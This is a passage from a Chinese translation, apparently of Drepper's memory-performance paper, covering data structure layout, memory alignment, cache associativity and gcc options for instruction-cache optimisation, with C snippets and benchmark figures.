中看到。</p><blockquote><table><thead><tr><th></th><th>原始</th><th>转置</th><th>子矩阵</th><th>向量化</th></tr></thead><tbody><tr><td>周期</td><td>16,765,297,870</td><td>3,922,373,010</td><td>2,895,041,480</td><td>1,588,711,750</td></tr><tr><td>相对</td><td>100%</td><td>23.4%</td><td>17.3%</td><td>9.47%</td></tr></tbody></table></blockquote><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291923912.png"></p><p>通过避免复制，我们又获得了 6.1% 的性能提升。另外，我们不需要任何额外的内存。输入矩阵可以任意大，只要结果矩阵也适合内存。这是我们现在实现的通用解决方案的要求。</p><p>表 6.2 中还有一列没有解释。大多数现代处理器现在包括对向量化的特殊支持。通常被品牌化为多媒体扩展，这些特殊指令允许同时处理 2、4、8 或更多值。这些通常是 SIMD（单指令，多数据）操作，通过其他操作获得正确形式的数据。英特尔处理器提供的 SSE2 指令可以同时处理两个 <code>double</code> 值。指令参考手册列出了提供这些 SSE2 指令访问的内建函数。如果使用这些内建函数，程序将比原始代码再快 7.3%（相对）。结果是程序运行时间为原始代码的 10%。换算成人们认识的数字，我们从 318 MFLOPS 提升到 3.35 GFLOPS。由于我们在这里只对内存效应感兴趣，程序代码被推到了第 9.1 节。</p><p>应该指出，在代码的最后一个版本中，我们仍然存在一些 <code>mul2</code> 的缓存问题；预取仍然不起作用。但这不能解决，除非转置矩阵。也许缓存预取单元会变得更聪明，以识别模式，那么不需要额外的更改。在 2.66 GHz 处理器上，单线程代码达到 3.19 GFLOPS 并不坏。</p><p>我们在矩阵乘法的示例中优化的是加载缓存行的使用。缓存行的所有字节总是被使用。我们只是确保在缓存行被清空之前使用它们。这当然是特例。</p><p>更常见的是，数据结构填满了一个或多个缓存行，程序在任何时候只使用几个成员。在图 3.11 中，我们已经看到了大型结构大小的影响，如果只使用少数成员。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291924879.png"></p><blockquote><p><strong>图 6.2：分布在多个缓存行上</strong></p></blockquote><p>图 6.2 显示了使用现在众所周知的程序执行的另一组基准测试的结果。这次两个相同列表元素的值被添加。在一种情况下，两个元素在同一个缓存行中；在另一种情况下，一个元素在列表元素的第一个缓存行中，第二个元素在最后一个缓存行中。图表显示了我们正在经历的减速。</p><p>毫不奇怪，在所有情况下，如果工作集适合 L1d，就没有负面影响。一旦 L1d 不再足够，就会因为使用两个缓存行而不是一个而受到惩罚。红线显示了数据，当列表在内存中顺序布局时。我们看到通常的两步模式：当 L2 缓存足够时，大约有 17% 的惩罚，当必须使用主内存时，大约有 27% 的惩罚。</p><p>在随机内存访问的情况下，相对数据看起来有点不同。适合 L2 的工作集的减速在 25% 到 35% 之间。超出这个范围后，它下降到大约 10%。这不是因为惩罚变小了，而是因为实际的内存访问变得不成比例地更昂贵。数据还表明，在某些情况下，元素之间的距离很重要。随机 4 CLs 曲线显示了更高的惩罚，因为使用了第一和第四个缓存行。</p><p>使用 pahole 程序（见 [dwarves]）可以很容易地看到数据结构与缓存行的布局比较。这个程序检查二进制文件中定义的数据结构。假设一个程序包含这个定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">foo</span> &#123;</span><br>   <span class="hljs-type">int</span> a;<br>   <span class="hljs-type">long</span> fill[<span class="hljs-number">7</span>];<br>   <span class="hljs-type">int</span> b;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 64 位机器上编译，pahole 的输出包含（除其他内容外）图 6.3 所示的信息。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291924100.png"></p><p>这个输出告诉我们很多。首先，它显示数据结构使用了一个以上的缓存行。该工具假设当前使用的处理器的缓存行大小，但这个值可以通过命令行参数覆盖。特别是在结构的大小刚好超过缓存行限制的情况下，并且分配了许多这种类型的对象，压缩该结构是有意义的。也许一些元素可以有更小的类型，或者某些字段实际上是可以用单独的位表示的标志。</p><p>在示例中，压缩很容易，程序本身就暗示了这一点。输出显示第一个元素之后有一个四字节的空洞。这个空洞是由结构和 <code>fill</code> 元素的对齐要求引起的。很容易看出，元素 <code>b</code>，大小为四个字节（由行尾的 4 表示），完全适合这个间隙。在这种情况下的结果是，间隙不再存在，数据结构适合一个缓存行。pahole 工具可以自己执行此优化。如果使用 <code>—reorganize</code> 参数，并将结构名称添加到命令行的末尾，工具的输出是优化后的结构和缓存行使用情况。</p><p>除了移动元素以填补空白外，该工具还可以优化位字段和组合填充和空洞。有关更多详细信息，请参见 [dwarves]。</p><p>拥有一个刚好足够容纳尾随元素的空洞当然是理想情况。要使这种优化有用，需要对象本身对齐到缓存行。我们将在下面讨论这个问题。</p><p>pahole 输出还有助于更容易地确定是否需要重新排序元素，以便一起使用的元素也一起存储。使用 pahole 工具，可以很容易地确定哪些元素在同一个缓存行中，以及何时需要重新洗牌元素以实现这一点。这不是一个自动化的过程，但该工具可以提供很大的帮助。</p><p>个体结构元素的位置和它们的使用方式也很重要。正如我们在第 3.5.2 节中看到的，具有关键字的代码的性能在缓存行后期更差。这意味着程序员应该始终遵循以下两条规则：</p><ol><li>始终将最有可能是关键字的结构元素移动到结构的开头。</li><li>在访问数据结构时，如果访问顺序不是由情况决定的，则按照结构中定义的顺序访问元素。</li></ol><p>对于小结构，这意味着程序员应该按照它们可能被访问的顺序排列元素。这必须以灵活的方式处理，以允许其他优化，如填补空白，也能适用。对于更大的数据结构，每个缓存行大小的块应该遵循规则进行排列。</p><p>如果对象本身没有对齐，那么重新排序元素是不值得花费时间的。对象的对齐由数据类型的对齐要求确定。每种基本类型都有自己的对齐要求。对于结构化类型，其元素中最大的对齐要求决定了结构的对齐。这几乎总是小于缓存行大小。这意味着即使结构的成员被排列以适应同一个缓存行，分配的对象可能没有匹配缓存行大小的对齐。</p><p>确保对象具有设计结构布局时使用的对齐的两种方法：</p><ul><li><p>对象可以具有显式的对齐要求进行分配。对于动态分配，调用 <code>malloc</code> 只会分配与最苛刻的标准类型（通常是 <code>long double</code>）匹配的对齐的对象。可以使用 <code>posix_memalign</code> 来请求更高的对齐。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">posix_memalign</span><span class="hljs-params">(<span class="hljs-type">void</span> **memptr,</span><br><span class="hljs-params">                    <span class="hljs-type">size_t</span> align,</span><br><span class="hljs-params">                    <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><p>这个函数将新分配的内存的指针存储在 <code>memptr</code> 指向的指针变量中。内存块大小为 <code>size</code> 字节，并在 <code>align</code> 字节边界上对齐。</p><p>对于编译器分配的对象（在 <code>.data</code>、<code>.bss</code> 等和栈上），可以使用变量属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">strtype</span> <span class="hljs-title">variable</span></span><br><span class="hljs-class">      __<span class="hljs-title">attribute__</span>((<span class="hljs-title">aligned</span>(64)));</span><br></code></pre></td></tr></table></figure><p>在这种情况下，无论 <code>strtype</code> 结构的对齐要求如何，<code>variable</code> 都在 64 字节边界上对齐。这对于全局变量和自动变量都有效。</p><p>这种方法对数组不起作用，除非数组的每个元素的大小是对齐值的倍数。它也意味着必须适当注释每个单独的变量。使用 <code>posix_memalign</code> 也不是完全免费的，因为对齐要求通常会导致碎片化和&#x2F;或更高的内存消耗。</p></li><li><p>类型的对齐要求可以使用类型属性更改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">strtype</span> &#123;</span><br>   ...members...<br>&#125; __attribute__((aligned(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><p>这将导致编译器分配所有对象的适当对齐，包括数组。程序员必须确保为动态分配的对象请求适当的对齐。这里再次使用 <code>posix_memalign</code>。使用 gcc 提供的 <code>alignof</code> 运算符并将其值作为第二个参数传递给 <code>posix_memalign</code> 是很容易的。</p><p>多媒体扩展在本节中提到，几乎总是要求内存访问对齐。也就是说，对于 16 字节的内存访问，地址应该在 16 字节对齐。x86 和 x86-64 处理器有特殊变体的内存操作可以处理未对齐的访问，但这些操作较慢。这种硬对齐要求对于大多数 RISC 架构来说并不新鲜，它们要求所有内存访问完全对齐。即使架构支持未对齐的访问，这有时也比使用适当的对齐慢，特别是如果错位导致加载或存储使用两个缓存行而不是一个。</p></li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291924578.png"></p><blockquote><p><strong>图 6.4：未对齐访问的开销</strong></p></blockquote><p>图 6.4 显示了未对齐内存访问的影响。现在众所周知的测试在访问内存时（顺序或随机）增加一个数据元素，一次使用对齐的列表元素，一次使用故意错位的元素。图表显示了程序因未对齐访问而产生的减速。顺序访问情况下的影响比随机访问情况更显著，因为在后一种情况下，未对齐访问的成本部分被通常更高的内存访问成本掩盖了。在顺序情况下，工作集大小适合 L2 缓存，减速约为 300%。这可以通过 L1 缓存的有效性降低来解释。一些增量操作现在触及两个缓存行，开始处理列表元素现在通常需要读取两个缓存行。L1 和 L2 之间的连接太拥挤了。</p><p>对于非常大的工作集大小，未对齐访问的影响仍然是 20% 到 30%——鉴于对齐访问时间已经很长了，这是很多。这张图应该表明对齐必须被认真对待。即使架构支持未对齐访问，也不能认为“它们和对齐访问一样好”。</p><p>这些对齐要求有一些副作用。如果一个自动变量有一个对齐要求，编译器必须确保在所有情况下都满足它。这不是微不足道的，因为编译器无法控制调用站点以及它们如何处理栈。这个问题可以通过两种方式处理：</p><ol><li><p>生成的代码积极对齐栈，必要时插入间隙。这需要代码来检查对齐，创建对齐，并稍后撤销对齐。</p></li><li><p>要求所有调用者都有对齐的栈。</p></li></ol><p>所有常用的应用程序二进制接口（ABIs）都遵循第二条路线。如果调用者违反了规则并且被调用者需要对齐，程序很可能会失败。保持对齐无损并不免费。</p><p>栈帧的大小在函数中使用不一定是对齐的倍数。这意味着如果从这个栈帧调用其他函数，则需要填充。编译器在大多数情况下知道栈帧的大小，因此它知道如何调整栈指针以确保任何从该栈帧调用的函数的对齐。事实上，大多数编译器会简单地将栈帧大小四舍五入并完成。</p><p>这种处理对齐的简单方法在变量长度数组（VLAs）或 <code>alloca</code> 使用时是不可能的。在这种情况下，栈帧的总大小只在运行时知道。可能需要主动对齐控制，使生成的代码（略微）变慢。</p><p>在某些架构上，只有多媒体扩展需要严格的对齐；这些架构上的栈对正常数据类型总是最小对齐，通常是 32 和 64 位架构的 4 或 8 字节对齐。在这些系统上，强制对齐会产生不必要的成本。这意味着，在这种情况下，我们可能想要消除严格的对齐要求，如果我们知道它永远不会依赖于它。尾部函数（不调用其他函数的函数）不需要对齐。同样，只调用不需要对齐的函数的函数也不需要对齐。如果能识别足够多的函数集，程序可能想要放宽对齐要求。对于 x86 二进制文件，gcc 支持放宽的栈对齐要求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">-mpreferred-<span class="hljs-built_in">stack</span>-boundary=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>如果给定的选项值为 N，则栈对齐要求将设置为 2N 字节。因此，如果使用值为 2，则栈对齐要求从默认值（16 字节）降低到仅 4 字节。在大多数情况下，这意味着不需要额外的对齐操作，因为正常的栈推送和弹出操作本来就在四字节边界上工作。这个特定于机器的选项可以帮助减少代码大小，也可以提高执行速度。但它不能适用于许多其他架构。即使对于 x86-64，它通常也不适用，因为 x86-64 ABI 要求将浮点参数传递到 SSE 寄存器中，而 SSE 指令需要完整的 16 字节对齐。尽管如此，只要这个选项可用，它就可以产生显著的差异。</p><p>高效放置结构元素和对齐并不是影响缓存效率的唯一数据结构方面。如果使用结构数组，则整个结构定义都会影响性能。记住图 3.11 中的结果：在这种情况下，数组元素中的未使用数据量不断增加。结果是预取越来越无效，对于大型数据集，程序变得效率越来越低。</p><p>对于大型工作集，尽可能使用可用的缓存非常重要。为了实现这一点，可能需要重新排列数据结构。虽然将概念上属于同一组的所有数据放在同一个数据结构中对程序员来说更容易，但这可能不是获得最大性能的最佳方法。假设我们有如下数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">order</span> &#123;</span><br>  <span class="hljs-type">double</span> price;<br>  <span class="hljs-type">bool</span> paid;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buyer[<span class="hljs-number">5</span>];<br>  <span class="hljs-type">long</span> buyer_id;<br>&#125;;<br></code></pre></td></tr></table></figure><p>进一步假设这些记录存储在一个大数组中，并且一个经常运行的工作将所有未结账单的预期付款总额加起来。在这种情况下，<code>buyer</code> 和 <code>buyer_id</code> 字段所使用的内存被不必要地加载到缓存中。根据图 3.11 中的数据，程序的性能可能比它可能的性能差 5 倍。</p><p>将 <code>order</code> 数据结构分成两个会更好，将前两个字段存储在一个结构中，将其他字段存储在其他地方。这个改变当然会增加程序的复杂性，但性能提升可能证明这种成本是合理的。</p><p>最后，让我们考虑另一种缓存使用优化，虽然它也适用于其他缓存，但主要是在 L1d 访问中感受到。如在图 3.8 中所见，缓存的关联度增加对正常操作有益。缓存越大，通常关联度越高。L1d 缓存太大，不能是完全关联的，但又不够大，不能像 L2 缓存那样具有相同的关联度。如果工作集中的许多对象落入同一个缓存集，这可能是一个问题。如果由于集的过度使用导致驱逐，程序可能会经历延迟，即使缓存的大部分未使用也是如此。有时称这些缓存未命中为冲突未命中。由于 L1d 寻址使用虚拟地址，这实际上是程序员可以控制的。如果一起使用的变量也存储在一起，那么它们落入同一组的可能性就最小化了。图 6.5 显示了问题可能有多快出现。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291925373.png"></p><blockquote><p><strong>图 6.5：缓存关联度效应</strong></p></blockquote><p>在图中，现在熟悉的 Follow {测试是在 32 位机器上执行的，因此 <code>NPAD</code> &#x3D;15 意味着每个列表元素一个 64 字节的缓存行。} 与 <code>NPAD</code> &#x3D;15 测试是在使用特殊设置进行测量的。X 轴是两个列表元素之间的距离，以空列表元素为单位。换句话说，距离为 2 意味着下一个元素的地址在前一个之后 128 字节。所有元素都以相同的距离在虚拟地址空间中布局。Y 轴显示列表的总长度。只使用一到 16 个元素，这意味着总工作集大小为 64 到 1024 字节。Z 轴显示遍历每个列表元素所需的平均周期数。</p><p>图中显示的结果不应令人惊讶。如果使用较少的元素，所有数据都适合 L1d，每个列表元素的访问时间仅为 3 个周期。对于列表元素的几乎所有排列：虚拟地址很好地映射到 L1d 插槽，几乎没有冲突。在这两个（在此图中）特殊的距离值中，情况是不同的。如果距离是 4096 字节（即距离 64 个元素）的倍数，并且列表的长度大于 8，则每个列表元素所需的平均周期数急剧增加。在这些情况下，所有条目都在同一组中，一旦列表长度超过关联度，条目就从 L1d 中被冲出，并且下一轮必须从 L2 中重新读取。这导致每个列表元素大约 10 个周期的成本。</p><p>有了这张图，我们可以确定使用的处理器具有 8 路关联和 32kB 总大小的 L1d 缓存。这意味着，如果必要，可以使用测试来确定这些值。相同的效应也可以在 L2 缓存上测量，但这里更复杂，因为 L2 缓存使用物理地址进行索引，而且它要大得多。</p><p>对于程序员来说，这意味着关联度是值得关注的。在现实世界中，以 2 的幂的边界布局数据的情况经常发生，但这正是可能导致上述效应和性能下降的情况。未对齐的访问可能会增加冲突未命中的概率，因为每次访问可能需要额外的缓存行。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291925778.png"></p><blockquote><p><strong>图 6.6：AMD 上的 L1d 银行地址</strong></p></blockquote><p>如果执行此优化，则还可以执行另一个相关的优化。至少，AMD 的处理器将 L1d 实现为几个单独的银行。L1d 每个周期可以接收两个数据字，但前提是这两个字存储在不同的银行中，或者存储在具有相同索引的银行中。银行地址编码在虚拟地址的低位中，如图 6.6 所示。如果一起使用的变量也存储在一起，则它们位于不同的银行或具有相同索引的相同银行的可能性很高。</p><h4 id="6-2-2-优化第1级指令缓存访问"><a href="#6-2-2-优化第1级指令缓存访问" class="headerlink" title="6.2.2 优化第1级指令缓存访问"></a>6.2.2 优化第1级指令缓存访问</h4><p>为良好的 L1i 使用做准备需要类似于良好 L1d 使用的技术。然而，问题是，除非程序员编写汇编代码，否则通常不会直接影响 L1i 的使用方式。如果使用编译器，程序员可以通过指导编译器创建更好的代码布局来间接确定 L1i 的使用。</p><p>代码的优势在于它在跳转之间是线性的。在这些时期，处理器可以有效地预取内存。跳转会扰乱这个美好的画面，因为</p><ul><li>跳转目标可能不是静态确定的；</li><li>即使它是静态的，如果它错过了所有缓存，内存获取可能需要很长时间。</li></ul><p>这些问题会在执行中造成停顿，可能严重影响性能。这就是为什么今天的处理器在分支预测（BP）上投入了大量资源。高度专业化的 BP 单元尽可能提前确定跳转的目标，以便处理器可以开始将新位置的指令加载到缓存中。它们使用静态和动态规则，并且越来越擅长在执行中确定模式。</p><p>将数据尽快放入缓存对于指令缓存更为重要。如第 3.1 节所述，指令必须在执行之前进行解码，为了加快这个速度（在 x86 和 x86-64 上很重要），指令实际上是以解码形式缓存的，而不是从内存中读取的字节&#x2F;字形式。</p><p>为了实现最佳的 L1i 使用，程序员应该至少注意以下代码生成方面的考虑：</p><ol><li><p>尽可能减少代码占用的内存。这必须与循环展开和内联等优化相平衡。</p></li><li><p>代码执行应该是线性的，没有气泡。{气泡在图形上描述了处理器管道中执行必须等待资源时出现的空缺。有关更多详细信息，请参阅有关处理器设计的文献。}</p></li><li><p>在有意义的情况下对齐代码。</p></li></ol><p>我们现在将看看一些编译器技术，这些技术可用于帮助根据这些方面优化程序。</p><p>编译器有选项启用优化级别；也可以单独启用特定优化。在高优化级别（gcc 的 -O2 和 -O3）启用的许多优化都涉及循环优化和函数内联。总的来说，这些是好的优化。如果通过这些方式优化的代码占程序总执行时间的很大一部分，则整体性能可以提高。特别是内联函数允许编译器一次性优化更大的代码块，这反过来又使得生成更好地利用处理器流水线架构的机器代码成为可能。通过死代码消除或值范围传播等方式处理代码和数据，在能够将程序的更大部分视为单个单元时，工作得更好。</p><p>更大的代码大小意味着对 L1i（以及 L2 和更高级别）缓存的压力更大。这可能导致性能降低。更小的代码可以更快。幸运的是，gcc 有一个优化选项可以指定这一点。如果使用 -Os，编译器将优化代码大小。已知会增加代码大小的优化被禁用。使用此选项通常会产生令人惊讶的结果。特别是如果编译器不能真正利用循环展开和内联，这个选项是一个大胜利。</p><p>内联也可以单独控制。编译器有启发式和限制来指导内联；这些限制可以由程序员控制。-finline-limit 选项指定函数必须有多大才能被认为太大而不适合内联。如果一个函数在多个地方被调用，在所有地方内联它会导致代码大小爆炸。但还有更多。假设函数 <code>inlcand</code> 在两个函数 <code>f1</code> 和 <code>f2</code> 中被调用。函数 <code>f1</code> 和 <code>f2</code> 本身是顺序调用的。</p><table><thead><tr><th>内联</th><th>无内联</th></tr></thead><tbody><tr><td><code>start f1</code><br><code>code f1</code><br><code>inlined inlcand</code><br><code>more code f1</code><br><code>end f1</code><br><code>start f2</code><br><code>code f2</code><br><code>inlined inlcand</code><br><code>more code f2</code><br><code>end f2</code></td><td><code>start inlcand</code><br><code>code inlcand</code><br><code>end inlcand</code><br><code>start f1</code><br><code>code f1</code><br><code>end f1</code><br><code>start f2</code><br><code>code f2</code><br><code>end f2</code></td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291925310.png"></p><p>表 6.3 显示了没有内联和在两个函数中都内联时生成的代码可能是什么样子。如果函数 <code>inlcand</code> 在 <code>f1</code> 和 <code>f2</code> 中都内联，生成的代码的总大小是：</p><p><code>size f1</code> + <code>size f2</code> + 2 × <code>size inlcand</code></p><p>如果没有发生内联，总大小就小了 <code>size inlcand</code>。这是 <code>f1</code> 和 <code>f2</code> 紧随其后被调用时需要的 L1i 和 L2 缓存的大小。另外：如果 <code>inlcand</code> 没有被内联，代码可能仍然在 L1i 中，并且不需要再次解码。另外：分支预测单元可能因为已经看过代码而做出更好的跳跃预测。如果编译器默认的内联函数大小上限对程序不是最好的，它应该被降低。</p><p>然而，有些情况下，内联总是有意义的。如果一个函数只被调用一次，它最好被内联。这给了编译器执行更多优化的机会（比如值范围传播，这可能显著改善代码）。内联可能因选择限制而受到挫败。gcc 对于这种情况有一个选项，总是内联一个函数。添加 <code>always_inline</code> 函数属性指示编译器做正如其名的事情。</p><p>在同样的情况下，如果一个函数不应该被内联，尽管它足够小，<code>noinline</code> 函数属性可以被使用。即使对于小函数，如果它们经常从不同的地方被调用，使用这个属性也是有意义的。如果 L1i 内容可以被重用，并且整体占用空间减少，这通常可以弥补额外的函数调用成本。分支预测单元现在非常好。如果内联可以导致更积极的优化，情况就不同了。这必须根据具体情况决定。</p><p><code>always_inline</code> 属性在内联代码总是被使用时效果很好。但如果这不是情况呢？如果内联函数只偶尔被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  ... code block A ...<br>  <span class="hljs-keyword">if</span> (condition)<br>    inlfct()<br>  ... code block C ...<br>&#125;<br></code></pre></td></tr></table></figure><p>通常，这样的代码序列生成的代码与源代码的结构相匹配。这意味着首先是代码块 A，然后是一个条件跳转，如果条件评估为 false，则跳过它。接下来是内联的 <code>inlfct</code> 生成的代码，最后是代码块 C。这看起来都是合理的，但它有一个问题。</p><p>如果 <code>condition</code> 经常为 false，执行就不是线性的。中间有一块大块未使用的代码，它不仅因为预取而污染了 L1i，还可能引起分支预测问题。如果分支预测错误，条件表达式可能会非常低效。</p><p>这是一般问题，不是特定于内联函数。无论何时使用条件执行，并且它是不平衡的（即，表达式远比另一个结果更频繁地导致一个结果），都可能存在错误的静态分支预测和因此管道中的气泡的风险。这可以通过告诉编译器将执行频率较低的代码移出主代码路径来防止。在这种情况下，<code>if</code> 语句生成的条件分支将跳转到一个顺序之外的地方，如下所示。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291926453.png"></p><p>上面的部分表示简单的代码布局。如果区域 B（例如，上面内联的函数 <code>inlfct</code>）经常不被执行，因为条件 I 跳过了它，处理器的预取将拉入包含块 B 的缓存行，这些缓存行很少被使用。使用块重排序，这可以改变，结果可以在下图的下半部分看到。经常执行的代码在内存中是线性的，而很少执行的代码被移动到不会影响预取和 L1i 效率的地方。</p><p>gcc 提供了两种方法来实现这一点。首先，编译器可以在重新编译代码时考虑分析输出，并根据配置布局代码块。我们将在第 7 节中看到这是如何工作的。第二种方法是通过显式分支预测。gcc 识别 <code>__builtin_expect</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> __builtin_expect(<span class="hljs-type">long</span> EXP, <span class="hljs-type">long</span> C);<br></code></pre></td></tr></table></figure><p>这个构造告诉编译器表达式 <code>EXP</code> 最有可能具有值 <code>C</code>。返回值是 <code>EXP</code>。<code>__builtin_expect</code> 旨在在条件表达式中使用。在几乎所有情况下，它将用于布尔表达式的上下文中，在这种情况下，定义两个辅助宏更方便：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlikely(expr) __builtin_expect(!!(expr), 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> likely(expr) __builtin_expect(!!(expr), 1)</span><br></code></pre></td></tr></table></figure><p>然后，这些宏可以像这样使用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(a &gt; <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><p>如果程序员使用这些宏，然后使用 <code>-freorder-blocks</code> 优化选项，gcc 将像上图所示重排序块。这个选项在 <code>-O2</code> 下启用，但在 <code>-Os</code> 下禁用。还有另一个选项来重排序块（<code>-freorder-blocks-and-partition</code>），但它的用途有限，因为它不能与异常处理一起使用。</p><p>小循环的另一个巨大优势，至少在某些处理器上是这样。Intel Core 2 前端有一个称为循环流检测器（LSD）的特殊功能。如果循环不超过 18 条指令（其中没有一条是对子程序的调用），只需要最多 4 次解码器获取 16 字节，最多有 4 条分支指令，并且执行次数超过 64 次，那么循环有时会被锁定在指令队列中，因此当循环再次使用时更快可用。这适用于通过外循环多次进入的小内部循环。</p><p>即使没有这样的专用硬件，紧凑的循环也有优势。内联不是关于 L1i 的唯一优化方面。另一个方面是对齐，就像数据一样。有明显差异：代码主要是线性的，不能在地址空间中任意放置，它不能由程序员直接通过编译器生成的代码来影响。有一些程序员可以控制的方面。</p><p>对齐每个单独的指令没有任何意义。目标是使指令流顺序。因此，只有在战略位置上对齐才有意义。为了决定在哪里添加对齐，需要了解对齐的优势。在缓存行的开头有一个指令意味着该缓存行的预取最大化了。对于指令，这也意味着解码器更有效。很容易看出，如果执行到缓存行末尾的指令，处理器必须准备好读取一个新的缓存行并解码指令。可能会出现问题（例如缓存行未命中），这意味着缓存行末尾的指令平均而言不如在开头的指令有效。</p><p>结合以下推论，如果控制刚刚转移到指令上（因此预取不有效），我们得出结论，代码对齐最有用的地点：</p><ul><li>在函数的开头；</li><li>在仅通过跳转到达的基本块的开头；</li><li>在某种程度上，在循环的开头。</li></ul><p>在前两种情况下，对齐几乎没有成本。执行在新位置继续，如果我们选择在缓存行的开头，我们优化了预取和解码。{对于指令解码处理器，通常使用比缓存行更小的单元，x86 和 x86-64 的情况下是 16 字节。} 编译器通过插入一系列无操作指令来填充对齐创建的间隙来实现这种对齐。这个“死代码”占用了一点空间，但通常不会影响性能。</p><p>第三种情况略有不同：对齐每个循环的开头可能会造成性能问题。问题是循环的开头通常紧跟着其他代码顺序执行。如果情况不是很幸运，上一条指令和对齐的循环开始之间将有一个间隙。与前两种情况不同，这个间隙不能完全是死的。执行完上一条指令后，循环中的第一个指令必须执行。这意味着，在执行完上一条指令后，必须执行一系列无操作指令来填补间隙，或者必须有一个无条件跳转到循环开始的指令。两种可能性都不是免费的。特别是如果循环本身执行得不频繁，无操作指令或跳转可能比通过对齐节省的成本更多。</p><p>程序员可以通过以下三种方式影响代码的对齐。显然，如果代码是用汇编器编写的，可以显式地对函数和其中的所有指令进行对齐。汇编器为所有架构提供了 <code>.align</code> 伪操作来执行此操作。对于高级语言，编译器必须了解对齐要求。与数据类型和变量不同，这在源代码中不可能。相反，使用编译器选项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">-falign-functions=N<br></code></pre></td></tr></table></figure><p>这个选项指示编译器将所有函数对齐到大于 <code>N</code> 的下一个幂次方二的边界。这意味着最多会创建 <code>N</code> 字节的间隙。对于小函数，使用大的 <code>N</code> 值是浪费。同样对于只执行很少的代码。后者可能在库中经常发生，这些库可能包含受欢迎和不受欢迎的接口。选择选项值的明智选择可以加速事情或通过避免对齐来节省内存。通过将 <code>N</code> 的值设置为 1 或使用 <code>-fno-align-functions</code> 选项，可以关闭所有对齐。</p><p>第二种情况——仅通过跳转到达的基本块的开头——可以通过不同的选项控制：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">-falign-jumps=N<br></code></pre></td></tr></table></figure><p>所有其他细节都是等效的，同样的内存浪费警告适用。</p><p>第三种情况也有自己的选项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">-falign-loops=N<br></code></pre></td></tr></table></figure><p>同样，同样的细节和警告适用。除了这里，正如之前解释的，对齐在运行时有成本，因为如果顺序到达对齐地址，必须执行无操作指令或跳转指令。</p><p>gcc 知道另一个控制对齐的选项，这里只提一下以供完整性。<code>-falign-labels</code> 对代码中每个单独的标签（基本上是每个基本块的开头）进行对齐。这在几乎所有情况下都会减慢代码速度，因此不应该使用。</p><h4 id="6-2-3-优化第2级和更高级别缓存访问"><a href="#6-2-3-优化第2级和更高级别缓存访问" class="headerlink" title="6.2.3 优化第2级和更高级别缓存访问"></a>6.2.3 优化第2级和更高级别缓存访问</h4><p>对于第1级缓存使用所说的一切都适用于第2级和更高级别的缓存访问。还有两个额外的方面适用于最后一级缓存：</p><ul><li>缓存未命中总是非常昂贵的。虽然 L1 未命中（希望如此）经常命中 L2 和更高级别的缓存，从而限制了惩罚，但显然没有回退到最后一级缓存。</li><li>L2 